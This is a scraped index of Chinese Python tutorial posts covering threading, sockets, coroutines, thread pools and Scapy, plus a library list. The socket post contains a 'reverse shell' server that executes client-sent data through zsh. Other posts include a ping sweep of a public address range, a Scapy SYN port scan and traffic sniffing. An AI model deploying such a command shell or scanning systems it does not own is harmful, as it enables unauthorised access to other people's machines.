","date":"2020-02-24","objectID":"/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/:1:1","tags":["Python","多线程"],"title":"python-多线程","uri":"/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Python"],"content":"threading (重点) 1.Thead类 使用threading模块 子类化Thread类 解决了线程数量可控的问题 简单例子： import threading import time import requests def func1(key): print(\"Hello %s:%s\"%(key, time.ctime())) print(threading.current_thread()) # 当前线程 print(\"*\"*20) def main(): threads = [] keys = ['张三', '李四', '王五', '陆大人'] threads_count = len(keys) # 生成参数长度个线程数 for i in range(threads_count): t = threading.Thread(target=func1, args=(keys[i],)) threads.append(t) # 线程加入线程列表 # 启动线程 for i in range(threads_count): threads[i].start() # 等待线程结束 join() for i in range(threads_count): threads[i].join() # 保证【所有】的线程都会结束 再运行主线程 遇到join会阻塞 if __name__ == '__main__': main() 实例: \"\"\" 对百度以10个线程访问10次 \"\"\" import threading import time import requests import sys def func1(): time_start = time.time() r = requests.get(url='http://www.baidu.com') times = time.time() - time_start # 耗时 sys.stdout.write(\"Status:%s---%s---%s\"%(r.status_code, times, time.strftime(\"%H:%M:%S\"))) # 当前时间 print(\"\") def main(): threads = [] threads_count = 10 # 定义 线程数 # 生成参数长度个线程数 for i in range(threads_count): t = threading.Thread(target=func1) threads.append(t) # 线程加入线程列表 # 启动线程 for i in range(threads_count): threads[i].start() # 等待线程结束 join() for i in range(threads_count): threads[i].join() # 保证【所有】的线程都会结束 再运行主线程 遇到join会阻塞 if __name__ == '__main__': main() 2.生产者-消费者问题 和 Queue模块 *(重中之重)* Queue模块[ qsize(), empty(), full(), put(), get() ] 完美搭档：Queue + Thread 解决了生产参数和计算结果时间都不确定的问题 最常使用 Queue： 将产生的货物放到Queue中，消费者从Queue中拿数据 import Queue q = queue.Queue(100) # 可以直接指定队列的大小 for i in range(10): q.put(i) # 也可以这样放入 q.empty() # 查看是否为空 q.qsize() # 查看大小 q.get() # 依次取出数据 q.full() # 是否满了 queue.task_done() # 告诉队列，这个任务执行完成了 生产者消费者讲解： \"\"\" 所谓，生产者与消费者模型，其实是把一个需要进程通信的问题分开考虑 生产者，只需要往队列里面丢东西（生产者不需要关心消费者） 消费者，只需要从队列里面拿东西（消费者也不需要关心生产者 生产者： 只关心队列是否已满。 没满，则生产，满了就阻塞。 消费者： 只关心队列是否为空。 不为空，则消费，为空则阻塞。 \"\"\" from threading import Thread # 线程 import random import queue import threading import time class Produce(Thread): def __init__(self, queue): super().__init__() self.queue = queue def run(self): while True: item = random.randint(0,99) if self.queue.full(): print(\"当前队列长度{}\".format(self.queue.qsize())) self.queue.put(item) # 只要队列没满， 向队列存入数据 print(\"生产者%s ==\u003e 已经生产 %s, 并将其加入到了队列中\" %(threading.current_thread(),item)) class Consumer(Thread): def __init__(self, queue): super().__init__() self.queue = queue def run(self): while True: item = self.queue.get() # 只要队列不为空， 就从队列中取出数据 print(\"消费者 ==\u003e 从队列中取出 %s\" %item) self.queue.task_done() # 告诉队列，这个任务执行完成了 if __name__ == '__main__': q = queue.Queue(10000) p = Produce(q) p1 = Produce(q) c = Consumer(q) p.start() p1.start() time.sleep(5) c.start() 实例： \"\"\" 使用 threding 和 Quque 结合， ping_check \"\"\" import threading import queue # 注意是小写 from subprocess import Popen,PIPE import sys # 继承多线程的类 class DoRun(threading.Thread): def __init__(self, queue): # threading.Thread.__init__(self) super().__init__() self._queue = queue # 重写了run方法 def run(self): # 如果Queue不为空就继续执行 while not self._queue.empty(): ip = self._queue.get() check_ping = Popen(['/bin/bash','-c','ping -c 2 '+ip], stdin=PIPE, stdout=PIPE) data = check_ping.stdout.read() if 'ttl' in str(data): sys.stdout.write(ip + \" is up\") print() def main(): threads = [] threads_count = 10 # 创建一个空的队列 q = queue.Queue() # put到队列 for i in range(1,255): q.put(\"123.206.96.\"+str(i)) # 多线程 for i in range(threads_count): threads.append(DoRun(q)) # 启动 for i in threads: i.start() for i in threads: i.join() if __name__ == '__main__': main() ","date":"2020-02-24","objectID":"/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/:2:0","tags":["Python","多线程"],"title":"python-多线程","uri":"/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Python"],"content":"讲解 C/S架构 客户机和服务器结构 Server唯一的目的就是等待client的请求，client连上server发送必要的数据，然后等待server端完成请求的范阔 C/S网络编程 Server端进行设置，首先创建一个通信端点，让server端能够监听请求，之后就进入等待和处理Client请求的无限循环中 Client编程相对Server端编程简单，只要创建一个通信端点，建立到服务器的连接，就可以提出wing我就来 套接字(socket) 是一种具有之前所说的“通信端点”概念的计算机网络数据结构。网络化的应用程序在开始任何通讯之前都必须创建套接字 套接字 = (ip, 端口) Python支持: - AF_UNIX –\u003e Unix下进行通信的 - AF_NETLINK –\u003e 是Linux下的套接字 - AF_INET –\u003e 是基于网络的套接字 （我们下面的重点） Python的socket模块创建TCP/IP套接字，方法如下： # 参数（套接字家族，套接字类型） # AF_INET：基于网络的， SOCK_SREAM：代表TCP/IP tcp_scoket = socket(socket.AF_INET, socket.SOCK_SREAM) 套接字对象的方法： 服务端套接字函数： 公共用途套接字函数： 创建连接之后要关闭 实例: ## 1.创建-个TCP服务器 SS. = socket() #创建服务器套接字 ss.bind() #把地址绑定到套接字上 s.listen() #监听连接 inf loop; #服务器无限循环 CS.= ss.accept() #接受客户端连接 cmmon loop; #通信循环 s.recy0/cs.send0 #对话(接受与发送) cs.close0 #关闭客户端套接字 ## 2、创建一个TCP客户端 cs.socket() #创建客户端套接字 cs.connect() #尝试连接套接字 common loop: #通信循环 cs.recx0/cs.send() #对话(接受与发送) cs.close() #关闭客户端套接字 反弹Shell： 在客户端获取服务端的shell 1.获取Linux的shell： server.py \"\"\" 反弹shell \"\"\" import socket from subprocess import Popen,PIPE # 执行系统命令 HOST = '' # 如果是本机最为服务端，地址可以不用填写 PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_server = socket.socket() # type默认是tcp tcp_server.bind(ADDR) tcp_server.listen(5) print(\"开始监听\") while True: # 服务端和客户端的循环连接 print(\"Waiting fpr connecting...\") coon, addr = tcp_server.accept() # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞 print(\"... connected from:\" + str(addr)) # 下面是通信的循环 while True: data = coon.recv(BUFSIZE) # 读取客户端发送的消息 （指明一次性能接收的最大字节数量） if data: try: # 执行获取服务端的系统命令（在客户端连接后可以执行服务端的命令） cmd = Popen(['/bin/zsh', '-c', data], stdin=PIPE, stdout=PIPE) cmd_data = cmd.stdout.read() coon.send(cmd_data) except Exception: continue else: print(\"客户端{}已断开\".format(addr)) break 2.获取Window的shell： client.py不变 import socket HOST = '' # 如果是本机最为服务端，地址可以不用填写 PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_cient = socket.socket() tcp_cient.connect(ADDR) print(\"客户端：\\n\") # 数据交互循环 while True: msg = input('\u003e\u003e\u003e') if msg: tcp_cient.send(msg.encode()) # 只能发送 bytes 类型的数据 data = tcp_cient.recv(BUFSIZE) if not data: break print(data.decode()) else: break # tcp_cient.close() # c.close() # 主动断开 # 服务端会recv到一个空字符串 1.阻塞的套接字 阻塞套接字不能和多个客户端进行通信 server.py \"\"\" 服务端： 阻塞套接字： ---\u003e 阻塞套接字不能和多个客户端进行通信 \"\"\" import socket HOST = '' # 如果是本机最为服务端，地址可以不用填写 PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_server = socket.socket() # type默认是tcp #tcp_server.bind(('',8888)) tcp_server.bind(ADDR) tcp_server.listen(5) # 可以挂起的最大连接数 accept就不算挂起 print(\"开始监听\") while True: # 服务端和客户端的循环连接 print(\"Waiting fpr connecting...\") coon, addr = tcp_server.accept() # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞 print(\"... connected from:\" + str(addr)) # 下面是通信的循环 while True: data = coon.recv(BUFSIZE) # 读取客户端发送的消息 （指明一次性能接收的最大字节数量） if data: print(data.decode()) # 向client发送收到的信息 coon.send(data) else: print(\"客户端{}已断开\".format(addr)) break #server端关闭连接 #tcp_server.close() #accpet 阻塞 recv阻塞(读不到数据，就一直等到有数据为止) client.py \"\"\" 最简单的客户端 三种方式的客户端都是一样的 \"\"\" import socket HOST = '' # 如果是本机最为服务端，地址可以不用填写 PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_cient = socket.socket() tcp_cient.connect(ADDR) print(\"客户端：\\n\") # 数据交互循环 while True: msg = input('\u003e\u003e\u003e') if msg: tcp_cient.send(msg.encode()) # 只能发送 bytes 类型的数据 data = tcp_cient.recv(BUFSIZE) if not data: break print(data.decode()) else: break # tcp_cient.close() # c.close() # 主动断开 # 服务端会recv到一个空字符串 2.I/O多路复用的套接字 server.py \"\"\" 服务端 I/O多路复用 \"\"\" # IO多路复用 # epoll 事件通知事件 # IO事件 计算机 可读事件（有数据了...） # 通知机制 （某一事情发送之后，可读之后） 轮询 # epoll： 当socket变为可读的时候，发出通知 # epoll： 是惰性的事件回调： 操作系统只起到通知的作用。 # epoll： 目前Linux上效率最高的IO多路复用 技术 ！ # 1.监听套接字 2.对等套接字 import socket import selectors # windows没有epoll sel = selectors.DefaultSelector() # 会根据不同的操作系统选择相应的解释器 在linux是epoll 根据系统自动选择 sel2 = selectors.EpollSelector() # 会根据不同的操作系统选择相应的解释器 在linux是epoll Linux server = socket.socket() server.bind(('127.0.0.1',8888)) server.listen(5) def accept(server): coon, addr = server.accept() sel.register(coon, selectors.EVENT_READ, read) def read(coon): data = coon.recv(1024) if data: print(data) server.send(da","date":"2020-02-24","objectID":"/python-socket%E7%BC%96%E7%A8%8B/:1:0","tags":["Python","socket"],"title":"python-socket编程","uri":"/python-socket%E7%BC%96%E7%A8%8B/"},{"categories":["Python"],"content":"概念 1.进程(同步) 进程是系统进行资源分配和调度的一个独立单位。每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信。 上下文进程间的切换开销，比较大，但相对比较稳定安全 2.线程（同步） 线程是CPU调度和分派的基本单位。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易丢失数据。 3.协程（异步） **协程是一种用户态的轻量级线程，**协程的调度完全由用户控制 “协程就是你可以暂停执行的函数”。协程拥有自己的寄存器上下文和栈。 非抢占式多任务 协程与线程的区别: 一个线程可以多个协程，一个进程也可以单独拥有多个协程。 线程进程都是同步机制，而协程则是异步。 协程能保留上一次调用时的状态，每次过程重入时，就相当于进入上一次调用的状态。 4）线程是抢占式，而协程是非抢占式的，所以需要用户自己释放使用权来切换到其他协程，因此同一时间其实只有一个协程拥有运行权，相当于单线程的能力。 5）协程并不是取代线程, 而且抽象于线程之上, 线程是被分割的CPU资源, 协程是组织好的代码流程, 协程需要线程来承载运行, 线程是协程的资源, 但协程不会直接使用线程, 协程直接利用的是执行器(Interceptor), 执行器可以关联任意线程或线程池, 可以使当前线程, UI线程, 或新建新程.。 6）线程是协程的资源。协程通过Interceptor来间接使用线程这个资源。 代码 greenlet # 协程 =\u003e又叫：非抢占式多任务 # 中断执行 # 线程 \"\"\" pip install greenlet \"\"\" # 基本使用 from greenlet import greenlet import random import time def Producer(): while True: item = random.randint(0, 99) print(\"pro生产了{}\".format(item)) c.switch(item) # 暂停当前协程,切换到(执行的协程)消费者，并将item传入消费者 time.sleep(1) def Consumer(): while True: item = p.switch() # 切换到生产者， 并等待消费者传入item print(\"消费了{}\".format(item)) c = greenlet(Consumer) # 将一个普通函数变成协程 p = greenlet(Producer) c.switch() # 让消费者先进入暂停状态， （只有恢复的时候才能接受数据） \"\"\" # greenlet 的价值 价值一： 高性能的原生协程 价值二： 语义更加明确的显式切换 价值三： 直接将函数包装成协程，保持原有代码风格 \"\"\" gevent gevent是一个基于协程的python网络库，在遇到IO阻塞时，程序会自动进行切换，可以让我们用同步的方式写异步IO代码。 # gevent # 当一个greenlet遇到IO操作，比如访问网络，就会自动切换，直到IO操作完成，再切换回来 # 遇到阻塞就切换到另一个协程继续执行 ！ \"\"\" pip install gevent gevent，通过封装了 libev（基于epoll） 和 greenlet 两个库。 帮我们做好封装，允许我们以类似于线程的方式使用协程。 以至于我们几乎不用重写原来的代码就能充分利用 epoll 和 协程 威力 \"\"\" import gevent from gevent.queue import Queue # 猴子补丁 monkey 将一些阻塞的模块动态的修改为非阻塞 from gevent import monkey;monkey.patch_all() # 不会阻塞了就 from gevent import monkey;monkey.patch_socket() # 不会阻塞了就 import requests import gevent def get_response(): print(\"start\") requests.get(\"https://www.baidu.com\") print(\"end\") tasks = [gevent.spawn(get_response) for i in range(20)] # 创建协程 gevent.joinall(tasks) # 阻塞等待协程完毕 # --------------------------------------------------------------------- ### gevent 并发服务器 import gevent # 将python内置的socket直接换成了IO多路复用的socket from gevent import monkey;monkey.patch_socket() import socket server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) def worker_coroutine(conn): while True: recv_data = conn.recv(1000) if recv_data: print(recv_data) conn.send(recv_data) else: conn.close() break if __name__ == '__main__': while True: conn, remote_addr = server.accept() # 生成一个协程， 并将conn作为参数传入 gevent.spawn(worker_coroutine, conn) # --------------------------------------------------------------------- # gevent 协程通信 \"\"\" 问题一： 协程之间不是能通过switch通信嘛？ 是的，由于 gevent 基于 greenlet，所以可以。 问题二： 那为什么还要考虑通信问题？ 因为 gevent 不需要我们使用手动切换， 而是遇到阻塞就切换，因此我们不会去使用switch ！ \"\"\" import gevent from gevent import monkey;monkey.patch_all() from gevent.queue import Queue import random queue = Queue(3) def Producer(): while True: item = random.randint(0, 99) print(\"生产了{}\".format(item)) queue.put(item) def Consumer(): while True: item = queue.get() print(\"消费了{}\".format(item)) p = gevent.spawn(Producer, queue) # 将函数封装成协程， 并开始调度 c = gevent.spawn(Consumer, queue) # gevent.sleep(5) gevent.joinall([p, c]) # 阻塞（一阻塞就切换协程） 等待 等待你带进来的所有协程对象结束 Note: # 这三句一定要放在最上面 import gevent from gevent import monkey monkey.patch_all() ","date":"2020-02-24","objectID":"/python-%E5%8D%8F%E7%A8%8B/:0:0","tags":["Python","协程"],"title":"python-协程","uri":"/python-%E5%8D%8F%E7%A8%8B/"},{"categories":["Python"],"content":" # from multiprocessing import Pool # 进程池 from multiprocessing.dummy import Pool #线程池 from multiprocessing.pool import ThreadPool # 线程池 import threading import time def func(i): print(\"{}-------555\".format(i)) time.sleep(2) return i def print_back(*args, **kwargs): print(\"处理数据完成\",args, kwargs) pool = Pool(6) # 不写的话 默认是cpu的个数 # print(threading.active_count()) for i in range(5): pool.apply_async(func=func, args=(i,), callback=print_back) ## 添加任务 不阻塞 主要使用的方法 # pool.apply(func=func, ) ## 添加任务 阻塞 # pool.map(func, [i for i in range(5)]) #添加任务 不阻塞 pool.close() #关闭线程池 不在提交新的任务 pool.join() #等待进程池中的任务执行完毕 print(\"任务结束\") ########### 线程池的步骤 p = ThreadPool(3) # 实例化 p.apply_async(func) # 函数 # 可以将返回值.get() 但是get也会i阻塞 p.close() p.join() # 进程池比线程池耗费资源 # 可以将返回值.get() 但是get也会i阻塞 async_result = p.apply_async(func) # 函数 print(async_result.get()) ","date":"2020-02-24","objectID":"/python-%E8%87%AA%E5%B8%A6%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%92%8C%E8%BF%9B%E7%A8%8B%E6%B1%A0/:0:0","tags":["Python","线程池"],"title":"python-自带的线程池和进程池","uri":"/python-%E8%87%AA%E5%B8%A6%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%92%8C%E8%BF%9B%E7%A8%8B%E6%B1%A0/"},{"categories":["Python"],"content":"server # 使用线程池来实现并发服务器 import socket from multiprocessing.dummy import Pool def worker(conn): while True: recv_data = conn.recv(1000) if not recv_data: break print(\"客户端{}发送了{}\".format(conn, recv_data.decode())) conn.send(recv_data) conn.close() if __name__ == '__main__': server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) pool = Pool(3) while True: conn, addr = server.accept() print(\"客户端{}连接成功\".format(addr)) pool.apply_async(func=worker, args=(conn,)) client import socket c = socket.socket() c.connect(('127.0.0.1',8888)) while True: msg = input('\u003e\u003e\u003e') if msg: c.send(msg.encode()) # 只能发送 bytes 类型的数据 encode将中文的变成byte的 print(c.recv(1024)) else: break c.close() ","date":"2020-02-24","objectID":"/python-%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%B9%B6%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8/:0:0","tags":["Python","线程池"],"title":"python-线程池并发服务器","uri":"/python-%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%B9%B6%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["Python"],"content":" # 多进程服务器 创建 销毁 # 通过提前创建好线程 当任务来了 就分配线程去执行 \"\"\" 主线程： 相当于生产者，只管向线程池提交任务。 并不关心线程池是如何执行任务的。 因此，并不关心是哪一个线程执行的这个任务。 线程池： 相当于消费者，负责接收任务， 并将任务分配到一个空闲的线程中去执行。 \"\"\" from threading import Thread from queue import Queue import time class ThreadPool: def __init__(self, n): # 意味着传啦几次 self.queue = Queue() for i in range(n+1): # 每个线程都去执行类里面的func方法 Thread(target=self.work, args=(self.queue, ), daemon=True).start() def work(self): while True: func, args, kwargs = self.queue.get() func(*args, **kwargs) self.queue.task_done() def apply_async(self, func, args=(), kwargs={}): # 主线程调用的 self.queue.put((func, args, kwargs)) # 扔到队列里面 def join(self): self.queue.join() def task1(): time.sleep(2) print(\"111\") def task2(): time.sleep(2) print(\"222222\") pool = ThreadPool(2) pool.apply_async(task1) pool.apply_async(task2) print(\"任务提交完成\") pool.join() print(\"任务完成\") ","date":"2020-02-24","objectID":"/python-%E7%AE%80%E5%8D%95%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E5%AE%9E%E7%8E%B0/:0:0","tags":["Python","线程池"],"title":"python-简单的线程池的实现","uri":"/python-%E7%AE%80%E5%8D%95%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E5%AE%9E%E7%8E%B0/"},{"categories":["Python"],"content":" import threading import queue class MyThread(threading.Thread): def __init__(self): super().__init__() self.queue = queue.Queue() self.daemon = True # 守护进程 self.start() # def run(self): # 只有run里的才是子线程执行的 while True: func, args, kwargs = self.queue.get() # 从队列当中获取任务 func(*args, **kwargs) self.queue.task_done() def apply_async(self, func, args=(), kwargs={}): self.queue.put((func, args, kwargs)) def join(self, timeout=None): # 等待所有提交的任务执行完毕 self.queue.join() # 解阻塞 def print_one(): print('111111111') def print_two(): print('222222222222') if __name__ == '__main__': t = MyThread() t.apply_async(print_one) t.apply_async(print_two, args=(1,2), kwargs={\"a\":1,'b':2}) t.join() # 线程的join 等待队列结束 ","date":"2020-02-24","objectID":"/python-%E5%8F%AF%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E7%9A%84%E7%BA%BF%E7%A8%8B/:0:0","tags":["Python","线程池"],"title":"python-可重复利用的线程","uri":"/python-%E5%8F%AF%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E7%9A%84%E7%BA%BF%E7%A8%8B/"},{"categories":["Python"],"content":"scapy -- 网络编程之利器","date":"2020-02-23","objectID":"/pythonscapy/","tags":["Python","渗透测试","Scapy"],"title":"Python之Scapy","uri":"/pythonscapy/"},{"categories":["Python"],"content":"关于 Scapy是一个Python程序，使用户能够发送，嗅探和剖析并伪造网络数据包。此功能允许构建可以探测，扫描或攻击网络的工具。 换句话说，Scapy是一个功能强大的交互式数据包操作程序。它能够伪造或解码大量协议的数据包，通过线路发送，捕获它们，匹配请求和回复等等。Scapy可以轻松处理大多数经典任务，如扫描，跟踪路由，探测，单元测试，攻击或网络发现。它可以取代hping，arpspoof，arp-sk，arping，p0f甚至是Nmap，tcpdump和tshark的某些部分。Scapy主要做两件事：发送数据包和接收答案。 在python中可以通过scapy这个库轻松实现构造数据包、发送数据包、分析数据包，为网络编程之利器！ 项目地址：https://github.com/secdev/scapy ","date":"2020-02-23","objectID":"/pythonscapy/:1:0","tags":["Python","渗透测试","Scapy"],"title":"Python之Scapy","uri":"/pythonscapy/"},{"categories":["Python"],"content":"安装 Scapy 有两种使用方式： 直接在shell中使用 # 先下载项目到本地 git clone git@github.com:secdev/scapy.git # 运行 ./run_scapy # 交互式使用 作为Python的第三方库使用 # 安装 pip3 install scapy # 导入 from scapy.all import * ","date":"2020-02-23","objectID":"/pythonscapy/:2:0","tags":["Python","渗透测试","Scapy"],"title":"Python之Scapy","uri":"/pythonscapy/"},{"categories":["Python"],"content":"使用 构造数据包 from scapy.all import * # 2.构造数据包 IP()创建一个默认数据包 # ls(IP()) 可以查看IP数据包可以有哪些参数。 # 其他数据包同理： TCP(), pkt = IP(dst=\"114.114.114.114\") pkt.show() # 查看数据包信息 pkt.summary() # 方法查看概要信息 hexdump(pkt) # 查看数据包的字节信息 # 使用 '/' 操作符来给数据包加上一层 # 例如构造一个TCP数据包，在IP层指明数据包的目的地址。在TCP层可以设定数据包的目的端口等等。UDP数据包同理。 tcpkt = IP(dst=\"114.114.114.114\")/TCP() tcpkt.show() # 数据包的目标端口可以用范围来表示，发送的时候就会发送dport 不同的多个数据包 tcpkt = IP(dst=\"114.114.114.114\")/TCP(dport=(22,33)) # 如果设置了多个参数为范围的，最后发送的数据包就是笛卡尔积。 tcpkt = IP(dst=\"114.114.114.114\")/TCP(dport=(22,33), sport=(4567, 4568)) for tcp in tcpkt: print(tcp.dport, tcp.sport) 发送数据包 (可能需要管理员权限) # 3.发送数据包 # 发送数据包可能需要管理员权限，使用sudo python3 进入python即可。 ## scapy发送数据包有常用的如下几种方法： \"\"\" send(pkt) 发送三层数据包，但不会受到返回的结果(发完就拉倒)。 sr(pkt) 发送三层数据包，返回两个结果，分别是接收到响应的数据包和未收到响应的数据包。 sr1(pkt) 发送三层数据包，仅仅返回接收到响应的数据包。 sendp(pkt) 发送二层数据包。 srp(pkt) 发送二层数据包，并等待响应。 srp1(pkt) 发送第二层数据包，并返回响应的数据包 \"\"\" # 例如： ans, uans = sr(pkt) print(ans) print(uans) 简单应用 # 4.应用 # 1）可以构造数据包来实现一个简单的 SYN端口扫描 ，flags=\"S\" 表示发送SYN数据包 port_scan = IP(dst=\"192.168.0.121\")/TCP(dport=[22,80,135,443,3306,3389], flags=\"S\") ans, uans = sr(port_scan) ans.summary() ''' 端口返回的flag位为 SA，表示这些端口是开放的。 而 RA 表示reset ack， 说明这些端口是关闭的。 【见下面图片】 ''' # 2）实现一个基于TCP的traceroute ans, uans = sr(IP(dst=\"114.114.114.114\", ttl=(1,20), id=RandShort())/TCP(flags=\"0x2\")) for snd, rcv in ans: print(snd.ttl, rcv.src, isinstance((rcv.payload, TCP)) # 3) 模拟TCP的三次握手 source = IP(dst=\"192.168.0.121\")/TCP(dport=22) rsp = sr1(source) source2 = IP(dst=\"192.168.0.121\")/TCP(dport=22, flags=\"A\", seq=rsp.ack, ack=rsp.seq+1) rsp2 = sr1(source2) print(rsp2.show()) 其他 # 5.其他 # scapy 还可以用来读取网络流量包或监听网卡流量。 \"\"\" 1. 使用函数 rdpcap(\"/abc/def/xxxx.pcap\") 可以读取包的内容， 2. 再使用 haslayer(TCP) 或 haslayer(ICMP) 等等来判断数据包的类型。 3. 使用 sniff(iface=\"who1\",count=100,filter=\"tcp xxxx\") 可以监听网卡流量，iface声明监听的网卡，filter是过滤条件，count是符合过滤条件的数据包的个数，达到指定的数据包个数后会停止监听，不设count则没有限制，按ctrl-c 结束监听。 4. sniff也支持无线网卡的监听模式。 \"\"\" 抓包、分析包 \"\"\" prn指向一个回调函数，意为将收到的包丢给prn指向的函数处理（注意：回调的意义！每收到一个包就丢到回调函数里执行一下，执行完了才再跑回来继续抓包） filter为包过滤规则（语法参照tcpdump过滤规则） store为是否要存储抓到的包（注意，如果没有存储则不会将抓到的包赋值给a，因为没有存下就没有东西可以赋，此参数默认开启） timeout为抓包时长，比如抓30秒就结束（注意：如果没有指定抓包时长则会一直抓下去，程序会一直卡在这里） iface为指定抓包的网卡 \"\"\" a = sniff(prn=abc, filter='tcp port 80 and ip 192.168.1.1', store=1, timeout=30, iface='eth0') # 此函数可以将抓到的包存到本地（注意：将包写入本地不能使用open（'packet.cap', 'r'）,因为open函数只能写入字符串）。 wrpcap('packet.cap', a) # 此函数可以将本地存储的数据包读取出来 bbb = rdpcap('/root/Desktop/ftp.cap') # 读取出来的对象是由N个数据包组成的可迭代对象，每次迭代一个包 for i in bbb: try: # 输出数据包的应用层负载 print(i.getlayer('Raw').fields['load'].decode().strip()) except : continue 先简单了解一下，剩下的后面慢慢学 更多用法见官方文档：https://scapy.readthedocs.io/en/latest/ ","date":"2020-02-23","objectID":"/pythonscapy/:3:0","tags":["Python","渗透测试","Scapy"],"title":"Python之Scapy","uri":"/pythonscapy/"},{"categories":["Python"],"content":" 转载自：https://www.jianshu.com/p/d25a9169fe86 哈哈哈，我见大佬把这么多库都整理出来了，赶紧转载一下，太厉害啦。 库名称 简介 Chardet 字符编码探测器，可以自动检测文本、网页、xml的编码。 colorama 主要用来给文本添加各种颜色，并且非常简单易用。 Prettytable 主要用于在终端或浏览器端构建格式化的输出。 difflib，[Python]标准库，计算文本差异Levenshtein，快速计算字符串相似度。 fuzzywuzzy 字符串模糊匹配。 esmre 正则表达式的加速器。 shortuuid 一组简洁URL/UUID函数库。 ftfy，Unicode文本工具7 unidecode，ascii和Unicode文本转换函数。 xpinyin，将汉字转换为拼音的函数库 pangu.py，调整对中日韩文字当中的字母、数字间距。 pyfiglet，Python写的figlet程序，使用字符组成ASCII艺术图片 uniout，提取字符串中可读写的字符 awesome slugify，一个Python slugify库，用于处理Unicode。 python-slugify，转换Unicode为ASCII内码的slugify函数库。 unicode-slugify，生成unicode内码，Django的依赖包。 ply，Python版的lex和yacc的解析工具phonenumbers，解析电话号码，格式，存储和验证的国际电话号码。 python-user-agents，浏览器的用户代理（user-agents）的解析器。 sqlparse，SQL解析器。 pygments，一个通用的语法高亮工具。 python-nameparser，解析人名，分解为单独的成分。 pyparsing，通用解析器生成框架。 tablib，表格数据格式，包括，XLS、CSV，JSON，YAML。 python-docx，docx文档读取，查询和修改，微软Word 2007 / 2008的docx文件。 xlwt/xlrd，读写Excel格式的数据文件。 xlsxwriter，创建Excel格式的xlsx文件。 xlwings，利用Python调用Excelcsvkit，CSV文件工具包。 marmir，把Python[数据结构]，转化为电子表格。 pdfminer，从PDF文件中提取信息。 pypdf2， 合并和转换PDF页面的函数库。 Python-Markdown，轻量级标记语言Markdown的Python实现。 Mistune，,快速、全功能的纯Python编写的Markdown解释器。 dateutil，标准的Python官方datetime模块的扩展包，字符串日期工具，其中parser是根据字符串解析成 datetime，而rrule是则是根据定义的规则来生成datetime。 arrow,更好的日期和时间处理Python库 chronyk，一个Python 3版函数库，用于解析人写的时间和日期。 delorean，清理期时间的函数库。 when.py，为见的日期和时间，提供人性化的功能。 moment，类似Moment.js的日期/时间Python库 pytz，世界时区，使用tz database时区信息[数据库] BeautifulSoup，基于Python的HTML/XML解析器，简单易用, 功能很强大,即使是有bug，有问题的html代码，也可以解析。 lxml，快速，易用、灵活的HTML和XML处理库，功能超强，在遇到有缺陷、不规范的xml时，Python自带的xml处理器可能无法解析。报错时，程序会尝试再用lxml的修复模式解析。 htmlparser，官方版解析HTML DOM树，偶尔搞搞命令行自动表单提交用得上。 pyyaml，Python版本的YAML解释器。 html5lib，-标准库，解析和序列化HTML文档和片段。 pyquery，类似[jQuery]的的HTML解释器函数库。 cssutils，Python CSS库。 MarkupSafe，XML或HTML / XHTML安全字符串标记工具。 cssutils - ACSS library for Python., MarkupSafe - Implements a XML/HTML/XHTMLbleach，漂白，基于HTML的白名单函数库。 xmltodict，类似JSON的XML工具包。 xhtml2pdf，HTML / CSS格式转换器，看生成pdf文档。 untangle，把XML文档，转换为Python对象，方便访问。 文件处理 库名称简介Mimetypes，Python标准库，映射文件名到MIME类型。 imghdr，Python标准库，确定图像类型。 python-magic，libmagic文件类型识别库，Python接口格式。 path.py，os.path模块的二次封装。 watchdog，一组API和shell实用程序，用于监视文件系统事件。 Unipath，面向对象的文件/目录的操作工具包。 pathlib，-（Python 3.4版已经作为Python标准库），一个跨平台，面向path的函数库。pickle/cPickle,python的pickle模块实现了基本的数据序列和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。 cPickle是[C语言]实现的版本，速度更快。 ConfigParser，Python标准库，INI文件解析器。 configobj，INI文件解析器。 config，分层次配置，logging作者编写。 profig，多格式配置转换工具。 logging，Python标准库，日志文件生成管理函数库。 logbook，logging的替换品。 Sentry，实时log服务器。 Raven，哨兵Sentry的Python客户端。 Sphinx，斯芬克斯（狮身人面像），Python文档生成器。 reStructuredText，标记语法和解析工具，Docutils组件。 mkdocs，Markdown格式文档生成器。 pycco，简单快速、编程风格的文档生成器。 pdoc，自动生成的Python库API文档epydoc，从源码注释中生成各种格式文档的工具 图像处理 库名称简介PIL（Python Image Library），基于Python的图像处理库，功能强大，对图形文件的格式支持广泛，内置许多图像处理函数，如图像增强、滤波[算法]等。 Pillow，图像处理库，PIL图像库的分支和升级替代产品。 Matplotlib，著名的绘图库，提供了整套和matlab相似的命令API，用以绘制一些高质量的数学二维图形，十分适合交互式地进行制图。 brewer2mpl，有一个专业的python配色工具包，提供了从美术角度来讲的精美配色。 PyGame基于Python的多媒体开发和游戏软件开发模块，包含大量游戏和图像处理功能。 